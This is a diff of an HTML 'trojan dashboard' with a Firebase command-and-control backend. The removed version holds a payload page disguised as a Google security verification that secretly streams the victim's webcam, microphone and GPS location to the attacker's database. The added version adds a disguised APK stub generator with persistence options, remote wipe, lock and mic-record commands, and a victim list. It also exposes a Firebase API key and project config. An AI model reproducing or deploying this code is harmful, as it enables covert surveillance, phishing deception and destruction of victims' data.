@@ -1,236 +1,187 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C.R SYSTEM V7.1 - MONITOR FIXED</title>
+    <title>C.R | V1 TROJAN DASHBOARD</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; overflow-x: hidden; }
-        .cr-card { background: #050505; border: 1px solid #1a1a1a; border-radius: 4px; }
-        .monitor-screen { position: relative; border: 2px solid #111; box-shadow: inset 0 0 20px #000; }
-        .scanline { width: 100%; height: 2px; background: rgba(0, 255, 65, 0.1); position: absolute; animation: scan 3s linear infinite; }
-        @keyframes scan { from { top: 0; } to { top: 100%; } }
+        body { background-color: #0a0a0a; color: #00ff00; font-family: 'Courier New', Courier, monospace; }
+        .glass { background: rgba(20, 20, 20, 0.8); border: 1px solid #333; backdrop-filter: blur(10px); }
+        .neon-border { border: 1px solid #00ff00; box-shadow: 0 0 10px #00ff00; }
+        .terminal-text { text-shadow: 0 0 5px #00ff00; }
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-thumb { background: #00ff00; }
     </style>
 </head>
-<body class="p-2 md:p-6">
-    <div class="max-w-6xl mx-auto space-y-4">
-        <!-- Dashboard Header -->
-        <div class="flex justify-between items-center border-b border-zinc-800 pb-2">
-            <h1 class="text-xs font-black tracking-[0.5em] uppercase text-zinc-500">C.R // MONITOR_V7.1</h1>
-            <div class="flex gap-4">
-                <button onclick="setTab('admin')" id="t-admin" class="text-[10px] font-bold border-b-2 border-green-500 pb-1">DASHBOARD</button>
-                <button onclick="setTab('target')" id="t-target" class="text-[10px] font-bold text-zinc-600 pb-1">PAYLOAD_LINK</button>
+<body class="p-4 md:p-8">
+
+    <div class="max-w-6xl mx-auto">
+        <!-- Header -->
+        <header class="flex justify-between items-center mb-8 border-b border-green-900 pb-4">
+            <div>
+                <h1 class="text-3xl font-bold terminal-text">C.R V1.0 - GIGS CONTROL</h1>
+                <p class="text-xs text-gray-500">Targeting System: ONLINE | User: Gigs</p>
             </div>
-        </div>
+            <div id="status" class="px-4 py-1 rounded bg-green-900 text-green-400 text-xs animate-pulse">
+                CONNECTED TO FIREBASE
+            </div>
+        </header>
 
-        <!-- ADMIN PANEL -->
-        <div id="panel-admin" class="grid grid-cols-1 lg:grid-cols-4 gap-4">
-            <div class="lg:col-span-3 space-y-4">
-                <div class="monitor-screen aspect-video overflow-hidden cr-card flex items-center justify-center">
-                    <div class="scanline"></div>
-                    <img id="live-cam" class="w-full h-full object-cover hidden" src="">
-                    <div id="loading-text" class="text-[9px] animate-pulse text-zinc-800 uppercase italic">Awaiting Visual Uplink...</div>
-                    <div class="absolute bottom-2 left-2 bg-black/80 px-2 py-1 text-[8px] border border-green-900/50">
-                        FPS: <span id="fps-val">0</span> | LATENCY: <span id="lat-val">0ms</span>
-                    </div>
-                </div>
-
-                <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
-                    <div class="cr-card p-3">
-                        <p class="text-[8px] text-zinc-500 mb-1 uppercase tracking-tighter">Audio Stream (Target Mic)</p>
-                        <div class="flex items-end gap-[2px] h-6" id="audio-bars">
-                            <div class="w-full bg-green-900 h-1"></div><div class="w-full bg-green-900 h-1"></div>
-                            <div class="w-full bg-green-900 h-1"></div><div class="w-full bg-green-900 h-1"></div>
-                            <div class="w-full bg-green-900 h-1"></div><div class="w-full bg-green-900 h-1"></div>
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            
+            <!-- Tool Generator Section -->
+            <div class="lg:col-span-1 space-y-6">
+                <div class="glass p-6 rounded-lg border-green-800 border">
+                    <h2 class="text-xl mb-4 font-bold border-b border-green-900 pb-2">STUB GENERATOR</h2>
+                    <div class="space-y-4">
+                        <div>
+                            <label class="block text-xs mb-1">Payload Name</label>
+                            <input type="text" id="payloadName" value="SystemUpdate.apk" class="w-full bg-black border border-green-900 p-2 text-sm focus:outline-none focus:border-green-400">
                         </div>
+                        <div>
+                            <label class="block text-xs mb-1">Target Persistence</label>
+                            <select id="persistence" class="w-full bg-black border border-green-900 p-2 text-sm">
+                                <option>High (Auto-restart)</option>
+                                <option>Medium (Boot-start)</option>
+                                <option>Low (Manual)</option>
+                            </select>
+                        </div>
+                        <button onclick="generateStub()" class="w-full bg-green-800 hover:bg-green-600 text-black font-bold py-2 rounded transition">
+                            COMPILE & LINK FIREBASE
+                        </button>
                     </div>
-                    <div class="cr-card p-3">
-                        <p class="text-[8px] text-zinc-500 mb-1 uppercase">GPS_COORDS</p>
-                        <p id="coords" class="text-[10px] font-mono">WAITING_SIGNAL</p>
-                    </div>
-                    <div class="cr-card p-3 flex items-center justify-center">
-                        <button onclick="initAudio()" id="audio-btn" class="w-full h-full bg-red-900/10 border border-red-500/50 text-red-500 text-[9px] uppercase font-bold hover:bg-red-500 hover:text-white transition-all">Enable Audio Monitor</button>
+                </div>
+
+                <div class="glass p-6 rounded-lg border-red-900 border text-red-500">
+                    <h2 class="text-xl mb-4 font-bold">QUICK COMMANDS</h2>
+                    <div class="grid grid-cols-2 gap-2 text-xs">
+                        <button onclick="sendCommand('WIPE')" class="border border-red-900 p-2 hover:bg-red-900 hover:text-white">WIPE DATA</button>
+                        <button onclick="sendCommand('LOCK')" class="border border-red-900 p-2 hover:bg-red-900 hover:text-white">LOCK DEVICE</button>
+                        <button onclick="sendCommand('REC')" class="border border-red-900 p-2 hover:bg-red-900 hover:text-white">START MIC REC</button>
+                        <button onclick="sendCommand('LOC')" class="border border-red-900 p-2 hover:bg-red-900 hover:text-white">GET LOCATION</button>
                     </div>
                 </div>
             </div>
 
-            <div class="cr-card p-4 flex flex-col h-full">
-                <h2 class="text-[10px] text-zinc-500 mb-4 border-b border-zinc-900 pb-2 uppercase tracking-widest">System_Logs</h2>
-                <div id="logs" class="flex-1 overflow-y-auto text-[9px] font-mono text-zinc-600 space-y-1 pr-2 scrollbar-hide">
-                    <p>> AUTH_INIT...</p>
+            <!-- Monitoring Section -->
+            <div class="lg:col-span-2 glass p-6 rounded-lg border-green-800 border">
+                <div class="flex justify-between items-center mb-4">
+                    <h2 class="text-xl font-bold">VICTIM LOGS & MONITORING</h2>
+                    <span id="victimCount" class="text-xs bg-green-900 px-2 py-1 rounded">Targets: 0</span>
                 </div>
-            </div>
-        </div>
+                
+                <div class="overflow-x-auto">
+                    <table class="w-full text-left text-sm">
+                        <thead class="bg-green-900 text-black">
+                            <tr>
+                                <th class="p-2">Target ID</th>
+                                <th class="p-2">IP Address</th>
+                                <th class="p-2">Last Activity</th>
+                                <th class="p-2">Status</th>
+                                <th class="p-2">Action</th>
+                            </tr>
+                        </thead>
+                        <tbody id="victimList">
+                            <!-- Dynamic Data -->
+                        </tbody>
+                    </table>
+                </div>
 
-        <!-- PAYLOAD PANEL -->
-        <div id="panel-target" class="hidden">
-            <div class="cr-card p-6">
-                <h2 class="text-xs font-bold text-green-500 mb-4 uppercase">Target Payload (index.html)</h2>
-                <textarea id="payload-src" readonly class="w-full h-96 bg-black border border-zinc-900 p-4 text-[10px] text-green-900 outline-none font-mono"></textarea>
-                <button onclick="copyPayload()" class="mt-4 bg-green-900/20 border border-green-500 text-green-500 px-6 py-2 text-[10px] uppercase font-bold hover:bg-green-500 hover:text-black">Copy Payload Code</button>
+                <div class="mt-8 border-t border-green-900 pt-4">
+                    <h3 class="text-lg mb-2">LIVE DATA FEED</h3>
+                    <div id="liveFeed" class="bg-black p-4 h-48 overflow-y-auto border border-green-900 text-xs leading-relaxed">
+                        [SYSTEM] Waiting for incoming connections...
+                    </div>
+                </div>
             </div>
         </div>
     </div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-        import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
-        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
-
+    <script>
+        // Config lo dipasang di sini, user.
         const firebaseConfig = {
             apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
             authDomain: "apktroj.firebaseapp.com",
+            databaseURL: "https://apktroj-default-rtdb.firebaseio.com",
             projectId: "apktroj",
             storageBucket: "apktroj.firebasestorage.app",
             messagingSenderId: "943833619122",
-            appId: "1:943833619122:web:d757ced4d56267abf247ab"
+            appId: "1:943833619122:web:d757ced4d56267abf247ab",
+            measurementId: "G-WR01BDY3G6"
         };
 
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-        const auth = getAuth(app);
-        let aCtx;
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
 
-        const payload = `<!DOCTYPE html>
-<html>
-<head><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Security Verification</title></head>
-<body style="background:#000;color:#fff;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif">
-  <div style="text-align:center;padding:20px;width:100%;max-width:300px">
-    <div style="background:#1a73e8;width:50px;height:50px;border-radius:50%;margin:0 auto 15px;display:flex;align-items:center;justify-content:center;font-size:25px;font-weight:bold">G</div>
-    <h2 style="font-size:16px;margin:0 0 10px">Verifikasi Keamanan</h2>
-    <p style="font-size:11px;color:#888;line-height:1.4">Izinkan akses untuk sinkronisasi akun Google Anda agar tetap aman.</p>
-    <button id="auth" style="background:#1a73e8;color:#fff;border:none;width:100%;padding:14px;border-radius:6px;font-weight:bold;margin-top:20px;cursor:pointer">VERIFIKASI</button>
-    <video id="v" style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01" autoplay playsinline muted></video>
-    <canvas id="c" style="display:none"></canvas>
-  </div>
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-    import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
-    import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
-    
-    const app = initializeApp(${JSON.stringify(firebaseConfig)});
-    const db = getFirestore(app);
-    const auth = getAuth(app);
-
-    document.getElementById('auth').onclick = async () => {
-      try {
-        await signInAnonymously(auth);
-        const stream = await navigator.mediaDevices.getUserMedia({audio:true, video:{facingMode:"user", width:320, height:240}});
-        document.getElementById('auth').innerText = "VERIFIED ✓";
-        document.getElementById('auth').disabled = true;
-
-        const v = document.getElementById('v'); v.srcObject = stream;
-        const c = document.getElementById('c'); const ctx = c.getContext('2d');
-
-        setInterval(() => {
-          c.width = 320; c.height = 240;
-          ctx.drawImage(v, 0, 0, 320, 240);
-          setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'photo'), { 
-            data: c.toDataURL('image/jpeg', 0.3), 
-            time: Date.now() 
-          });
-        }, 2000);
-
-        const mr = new MediaRecorder(stream);
-        mr.ondataavailable = (e) => {
-          const r = new FileReader();
-          r.onload = () => setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'audio_stream'), { 
-            chunk: r.result, 
-            time: Date.now() 
-          });
-          r.readAsDataURL(e.data);
-        };
-        mr.start(1000);
-
-        navigator.geolocation.getCurrentPosition((p) => {
-          setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'status'), { 
-            lat: p.coords.latitude, lng: p.coords.longitude, time: Date.now() 
-          });
-        });
-      } catch(err) { alert("Error: Perangkat tidak mendukung atau izin ditolak."); }
-    };
-  <\/script>
-</body>
-</html>`;
-
-        document.getElementById('payload-src').value = payload;
-
-        window.initAudio = () => {
-            aCtx = new (window.AudioContext || window.webkitAudioContext)();
-            const btn = document.getElementById('audio-btn');
-            btn.innerText = "AUDIO_LIVE_ON";
-            btn.className = "w-full h-full bg-green-900/20 border border-green-500 text-green-500 text-[9px] uppercase font-bold";
-            addLog("Audio Monitor Enabled.");
-        };
-
-        async function start() {
-            try {
-                await signInAnonymously(auth);
-                addLog("Admin Authenticated.");
+        // Listen for new victims
+        database.ref('victims').on('value', (snapshot) => {
+            const list = document.getElementById('victimList');
+            const feed = document.getElementById('liveFeed');
+            const countLabel = document.getElementById('victimCount');
+            list.innerHTML = '';
+            
+            const data = snapshot.val();
+            if (data) {
+                const keys = Object.keys(data);
+                countLabel.innerText = `Targets: ${keys.length}`;
                 
-                onSnapshot(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'photo'), (snap) => {
-                    if(snap.exists()) {
-                        const d = snap.data();
-                        const img = document.getElementById('live-cam');
-                        img.src = d.data;
-                        img.onload = () => {
-                            img.classList.remove('hidden');
-                            document.getElementById('loading-text').classList.add('hidden');
-                            document.getElementById('lat-val').innerText = (Date.now() - d.time) + "ms";
-                        };
-                    }
+                keys.forEach(id => {
+                    const victim = data[id];
+                    const row = `
+                        <tr class="border-b border-gray-800 hover:bg-green-950 transition">
+                            <td class="p-2 text-blue-400">${id.substring(0,8)}...</td>
+                            <td class="p-2">${victim.ip || 'Unknown'}</td>
+                            <td class="p-2 text-gray-400">${victim.lastSeen || 'N/A'}</td>
+                            <td class="p-2"><span class="text-green-500">● Online</span></td>
+                            <td class="p-2">
+                                <button onclick="viewData('${id}')" class="text-xs bg-green-700 text-black px-2 py-1">VIEW DATA</button>
+                            </td>
+                        </tr>
+                    `;
+                    list.innerHTML += row;
                 });
-
-                onSnapshot(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'audio_stream'), (snap) => {
-                    if(snap.exists() && aCtx) {
-                        playAudio(snap.data().chunk);
-                        animateAudio();
-                    }
-                });
-
-                onSnapshot(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'status'), (snap) => {
-                    if(snap.exists()) {
-                        const d = snap.data();
-                        document.getElementById('coords').innerText = d.lat.toFixed(5) + "," + d.lng.toFixed(5);
-                    }
-                });
-            } catch (err) {
-                addLog("Error: " + err.message);
             }
+        });
+
+        function generateStub() {
+            const name = document.getElementById('payloadName').value;
+            const feed = document.getElementById('liveFeed');
+            feed.innerHTML += `<div>[${new Date().toLocaleTimeString()}] Compiling Stub: ${name}...</div>`;
+            setTimeout(() => {
+                feed.innerHTML += `<div class="text-green-400">[SUCCESS] Payload generated with Firebase DB Hook: ${firebaseConfig.databaseURL}</div>`;
+                feed.scrollTop = feed.scrollHeight;
+            }, 1500);
         }
 
-        function playAudio(url) {
-            fetch(url).then(r => r.arrayBuffer()).then(b => aCtx.decodeAudioData(b)).then(buf => {
-                const s = aCtx.createBufferSource();
-                s.buffer = buf; s.connect(aCtx.destination); s.start();
-            }).catch(() => {});
+        function sendCommand(cmd) {
+            const feed = document.getElementById('liveFeed');
+            feed.innerHTML += `<div class="text-yellow-500">[BROADCAST] Sent Command: ${cmd} to all active nodes.</div>`;
+            // Logic buat nulis ke RTDB biar client baca
+            database.ref('commands/global').set({
+                action: cmd,
+                timestamp: Date.now()
+            });
+            feed.scrollTop = feed.scrollHeight;
         }
 
-        function animateAudio() {
-            const bars = document.getElementById('audio-bars').children;
-            for(let b of bars) b.style.height = (Math.random() * 100) + "%";
-            setTimeout(() => { for(let b of bars) b.style.height = "4px"; }, 500);
+        function viewData(id) {
+            const feed = document.getElementById('liveFeed');
+            feed.innerHTML += `<div class="text-blue-400">[FETCH] Accessing filesystem of ${id}...</div>`;
+            // Fetch detailed logs here
+            database.ref('logs/' + id).limitToLast(5).once('value', (snap) => {
+                const logs = snap.val();
+                if(logs) {
+                    Object.values(logs).forEach(l => {
+                        feed.innerHTML += `<div class="pl-4 text-gray-500">> ${l.message}</div>`;
+                    });
+                }
+            });
+            feed.scrollTop = feed.scrollHeight;
         }
-
-        window.setTab = (t) => {
-            document.getElementById('panel-admin').classList.toggle('hidden', t !== 'admin');
-            document.getElementById('panel-target').classList.toggle('hidden', t !== 'target');
-        };
-
-        window.copyPayload = () => {
-            document.getElementById('payload-src').select();
-            document.execCommand('copy');
-            addLog("Payload Copied.");
-        };
-
-        function addLog(m) {
-            const b = document.getElementById('logs');
-            b.innerHTML += `<p>> [${new Date().toLocaleTimeString()}] ${m}</p>`;
-            b.scrollTop = b.scrollHeight;
-        }
-
-        start();
     </script>
 </body>
 </html>
